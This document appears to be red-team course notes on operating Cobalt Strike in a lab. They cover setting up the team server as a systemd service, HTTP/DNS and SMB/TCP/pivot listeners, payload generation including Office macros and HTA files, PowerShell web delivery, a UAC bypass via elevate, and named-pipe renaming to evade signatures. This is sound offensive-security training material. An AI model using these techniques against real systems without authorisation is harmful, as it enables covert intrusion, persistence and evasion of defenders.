## Start Team Server

---

``` bash
sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
```
Where:
	- `10.10.5.50` is the IP address of the Attacker Linux VM.
	- `Passw0rd!` is the shared password used to connect from the Cobalt Strike client.
	- `webbug.profile` is an example Malleable C2 profile (covered in more detail later).

### Run as a Service

```
sudo vim /etc/systemd/system/teamserver.service
```

```
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target
```

```
sudo systemctl daemon-reload
sudo systemctl status teamserver.service
sudo systemctl start teamserver.service
sudo systemctl enable teamserver.service
```

## Egress Listeners

---

An egress listener is one that allows Beacon to communicate outside of the target network to our team server.  The default egress listener types in Cobalt Strike are HTTP/S and DNS, where Beacon will encapsulate C2 traffic over these respective protocols.

### HTTP

The HTTP listener allows Beacon to send and receive C2 messages over HTTP GET and/or POST requests.

Create:
1. click Add
2. select Beacon HTTP for payload type
3. give the listener a name
4. click Save

![](https://files.cdn.thinkific.com/file_uploads/584845/images/648/bc2/be9/http-listener.png)

Verify:
```
sudo ss -lntp
State            Recv-Q           Send-Q                       Local Address:Port                        Peer Address:Port           Process
LISTEN           0                50                                       *:80                                     *:*               users:(("TeamServerImage",pid=1967,fd=7))
```

### DNS

The DNS listener allows Beacon to send and receive C2 messages over several lookup/response types including A, AAAA and TXT.  TXT are used by default because they can hold the most amount of data.  This requires we create one or more DNS records for a domain that the team server will be authoritative for.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/229/979/10d/dns-listener.png)

Verify:
```
dig @ns1.nickelviper.com test.pics.nickelviper.com +short
0.0.0.0
```


## Peer-to-Peer Listeners

---

Peer-to-peer (P2P) listeners differ from egress listeners because they don't communicate with the team server directly.  Instead, P2P listeners are designed to chain multiple Beacons together in parent/child relationships.  The primary reasons for doing this are:

1. To reduce the number of hosts talking out to your team server, as the higher the traffic volume, the more likely it is to get spotted.
2. To run Beacon on machines that can't even talk out of the network, e.g. in cases of firewall rules and other network segregations.

The two P2P listener types in Cobalt Strike are Server Message Block (SMB) and raw TCP.  It's important to understand that these protocols do not leave the target network (i.e. the team server is not listening on port 445 for SMB).  Instead, a child SMB/TCP Beacon will be linked to an egress HTTP/DNS Beacon, and the traffic from the child is sent to the parent, which in turn sends it to the team server.

### SMB

SMB listeners are very simple as they only have a single option - the named pipe name.  The default is `msagent_##` (where `##` is random hex), but you can specify anything you want.  A Beacon SMB payload will start a new named pipe server with this name and listen for an incoming connection.  This named pipe is available both locally and remotely.
  
This default pipe name is quite well signatured.  A good strategy is to emulate names known to be used by common applications or Windows itself.  Use `PS C:\> ls \\.\pipe\` to list all currently listening pipes for inspiration.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/4c1/b30/df8/smb-listener.png)

### TCP

A Beacon TCP payload will bind and listen on the specified port number.  You may also specify whether it will bind to only the localhost (127.0.0.1), otherwise it will bind to all interfaces (0.0.0.0).

![](https://files.cdn.thinkific.com/file_uploads/584845/images/b20/f9c/4af/tcp-listener.png)

## Pivot Listeners

---

A pivot listener can only be created on an existing Beacon, and not via the normal Listeners menu.  These listeners work in the same way as regular TCP listeners, but in reverse.  A standard Beacon TCP payload binds to 127.0.0.1 (or 0.0.0.0) and listens for an incoming connection on the specified port.  You then initiate a connection to it from an existing Beacon (with the `connect` command).  The pivot listener works the other way around by telling the existing Beacon to bind and listen on a port, and the new Beacon TCP payload initiates a connection to it instead.

To create a pivot listener, right-click on a Beacon and select _Pivoting > Listener_.  This will open a "New Listener" window.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/1e1/fe4/870/pivot-listener.png)

Verify:
```
beacon> run netstat -anop tcp

Active Connections

  Proto  Local Address          Foreign Address        State           PID

  TCP    0.0.0.0:4444           0.0.0.0:0              LISTENING       6920
```

The PID 6920 matches the PID of the Beacon.

We can now generate payloads for this listener, and it also becomes available in all the usual commands such as `spawn`, `elevate`, and `jump`, etc.  Once executed, the reverse TCP Beacon will appear immediately in the UI and the arrow in the graph view shows the direction of the connection.

## Generating Payloads

---

### HTML Application

Produces a `.hta` file (typically delivered through a browser by way of social engineering) uses embedded VBScript to run the payload. Only generates payloads for egress listeners and is limited to x86.  
  
### MS Office Macro

Produces a piece of VBA that can be dropped into a macro-enabled MS Word or Excel document. Only generates payloads for egress listeners but is compatible with both x86 and x64 Office.

### Stager Payload Generator

Produces a payload stager in a variety of languages including C, C#, PowerShell, Python, and VBA. These are useful when building your own custom payloads or exploits.  Only generates payloads for egress listeners, but supports x86 and x64.

### Stageless Payload Generator

As above, but generates stageless payloads rather than stagers. It has slightly fewer output formats, e.g. no PowerShell, but has the added option of specifying an exit function (process or thread). It can also generate payloads for P2P listeners.

### Windows Stager Payload

Produces a pre-compiled stager as an EXE, Service EXE or DLL.

### Windows Stageless Payload

Produces a pre-compiled stageless payload as an EXE, Service EXE, DLL, shellcode, as well as PowerShell. This is also the only means of generating payloads for P2P listeners.

### Windows Stageless Generate All Payloads

Pretty much what it says on the tin. Produces every stageless payload variant, for every listener, in x86 and x64.

[Learn More](https://buffered.io/posts/staged-vs-stageless-handlers/)

Use this last option to output payloads for all your listeners to `C:\Payloads`.  
  
![](https://files.cdn.thinkific.com/file_uploads/584845/images/e29/763/8d3/payloads.png)

## Create Beacon Payload

---

go to `Attacks > Scripted Web Delivery (S)` and generate a 64-bit PowerShell payload

![](https://files.cdn.thinkific.com/file_uploads/584845/images/94e/ba0/32d/swd.png)
![](https://files.cdn.thinkific.com/file_uploads/584845/images/5c5/5b6/77d/oneliner.png)


## Host a File

---

`Site Management > Host File` and select document

![](https://files.cdn.thinkific.com/file_uploads/584845/images/087/4fa/7c4/host-file.png)


## UAC Bypass via [Elevate Kit](https://github.com/cobalt-strike/ElevateKit)

---

```
beacon> elevate uac-schtasks tcp-local
[*] Tasked Beacon to run windows/beacon_bind_tcp (127.0.0.1:4444) in a high integrity context
[+] established link to child beacon: 10.10.123.102
```


## Beacon Passing

---

In this example, I have a DNS Beacon checking in from bfarmer every 1 minute.  Instead of operating through this Beacon, I want to leave it open as a lifeline on a slow check-in.  In which case, I can spawn a new HTTP session and work from there instead.

```
beacon> spawn x64 http
```


## Import Scripts

---

`Cobalt Strike > Script Manager` and load a `.cna` script.